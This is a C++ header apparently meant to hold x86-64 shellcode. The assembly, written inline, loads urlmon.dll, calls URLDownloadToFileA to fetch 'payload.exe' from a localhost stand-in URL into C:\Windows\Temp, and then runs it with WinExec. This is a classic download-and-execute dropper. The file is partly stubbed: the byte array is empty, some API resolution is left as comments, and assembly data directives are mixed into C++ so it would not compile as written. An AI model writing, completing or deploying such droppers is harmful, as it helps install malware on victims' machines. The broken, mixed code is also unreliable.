#pragma once
#include <cstddef>

// SHELLCODE_START
    ;
    push rdx
    xor rcx, rcx
    mov rdx, (dll_list_ptr)         ; stub: PEB

    ;
    lea rcx, [rip + urlmon_str]
    call rax                        ; LoadLibraryA("urlmon.dll") → hUrlMon in rax

    ;
    mov rcx, rax                    ; hUrlMon
    lea rdx, [rip + download_str]   ; "URLDownloadToFileA"
    call rbx                        ; GetProcAddress → rax

    ;
    lea rcx, [rip + url_str]        ; "http://localhost/payload.exe"
    lea rdx, [rip + dest_str]       ; "C:\\Windows\\Temp\\payload.exe"
    xor r8, r8                      ; Reserved = 0
    xor r9, r9                      ; Reserved = 0
    call rax                        ; URLDownloadToFileA

    ;
    lea rcx, [rip + dest_str]
    mov edx, 1                      ; SW_SHOWNORMAL
    ; Get WinExec the same way (LoadLibraryA&GetProcAddress as above) into rax
    call rax

    ;
    xor rcx, rcx
    ; Get ExitProcess into rax
    call rax

    ret

// SHELLCODE_END

static const unsigned char code[] = {
    // BYTES_BEGIN
    // BYTES_END
};

static const size_t codeSize = sizeof(code);

urlmon_str:    db "urlmon.dll",0
download_str:  db "URLDownloadToFileA",0
url_str:       db "http://localhost/payload.exe",0
dest_str:      db "C:\\Windows\\Temp\\payload.exe",0
